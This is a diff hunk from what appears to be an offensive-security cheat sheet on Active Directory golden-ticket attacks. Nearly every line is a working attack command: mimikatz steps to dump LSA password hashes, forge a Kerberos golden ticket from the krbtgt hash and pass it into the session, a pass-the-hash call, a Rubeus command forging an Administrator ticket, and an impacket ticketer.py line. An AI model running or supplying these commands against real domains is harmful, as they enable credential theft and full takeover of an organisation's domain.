@@ -417,8 +417,9 @@ privilege::debug
 lsadump::lsa /patch(get password hash)
 kerberos::purge
 kerberos::golden /user:any_exist_domain_user /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part,from lsadump::lsa /patch) /krbtgt:75b60230a2394a812000dbfad8415965(from lsadump::lsa /patch) /ptt
-misc::cmd(launch a new command prompt)
-psexec.exe \\dc01 cmd.exe
+misc::cmd(launch a new command prompt) | sekurlsa::pth
+
+Rubeus.exe golden /domain:yourdomain.com /sid:S-1-5-21-xxxxxxxx-xxxxxxxx-xxxxxxxx /krbtgt:bfb69399cb7ac7828c70a1a0833119f6 /user:Administrator /id:500 /ptt
 
 # To generate the TGT with NTLM
 python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
